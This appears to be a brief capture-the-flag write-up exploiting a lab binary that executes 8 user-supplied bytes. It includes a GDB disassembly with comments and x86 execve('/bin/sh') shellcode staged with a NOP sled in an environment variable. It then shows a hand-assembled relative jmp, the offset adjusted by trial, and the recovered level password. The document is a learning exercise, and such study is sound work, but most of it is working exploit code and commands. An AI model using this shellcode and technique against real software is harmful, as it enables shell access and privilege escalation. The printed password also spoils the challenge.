
Dump of assembler code for function main:
```assembly
   0x0804841b <+0>:	push   ebp
   0x0804841c <+1>:	mov    ebp,esp
   0x0804841e <+3>:	sub    esp,0xc
   0x08048421 <+6>:	lea    eax,[ebp-0xc]
   0x08048424 <+9>:	mov    DWORD PTR [ebp-0x4],eax
   0x08048427 <+12>:	cmp    DWORD PTR [ebp+0x8],0x2
   0x0804842b <+16>:	je     0x8048434 <main+25>		#if num of argv is 2 (filename+extra)
   0x0804842d <+18>:	push   0x1
   0x0804842f <+20>:	call   0x80482e0 <exit@plt>
   0x08048434 <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048437 <+28>:	add    eax,0x4
   0x0804843a <+31>:	mov    eax,DWORD PTR [eax]
   0x0804843c <+33>:	push   0x8
   0x0804843e <+35>:	push   eax
   0x0804843f <+36>:	lea    eax,[ebp-0xc]
   0x08048442 <+39>:	push   eax
   0x08048443 <+40>:	call   0x8048300 <strncpy@plt>		#copy 8 bytes from envp[1] to ebp-0xc 
   0x08048448 <+45>:	add    esp,0xc
   0x0804844b <+48>:	mov    eax,DWORD PTR [ebp-0x4]		
   0x0804844e <+51>:	call   eax				#call address of ebp-0x4
   0x08048450 <+53>:	mov    eax,0x0				#we can execute our 8 bytes...
   0x08048455 <+58>:	leave  
---Type <return> to continue, or q <return> to quit---
   0x08048456 <+59>:	ret    
```
End of assembler dump.

as you can see, we can execute 8 bytes of our choice, though not long enough for shellcode, we might still
be able to use jmp or call...

we lay the ground:
```sh
export EGG
EGG=$(python -c 'print "\x90"*100+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

address of shell code: 0xffffde68

assembly code of jmp to address:
```assembly
section .data

section .text
        global _start

_start:
        jmp 0xffffde68

section .rodata
```

we compile and get the opcodes, we get:
r $(python -c 'print "\xe9\x64\xde\xff\xff"')
we run this and see we miss the target by a bunch: 0xffffb4a5 in ?? ()
so we reset the jmp to 0x00000000, and it gets us to 0xffffd641

so we adjust: 
r $(python -c 'print "\xe9\x28\x08\x00\x00"')

we get: beinguthok



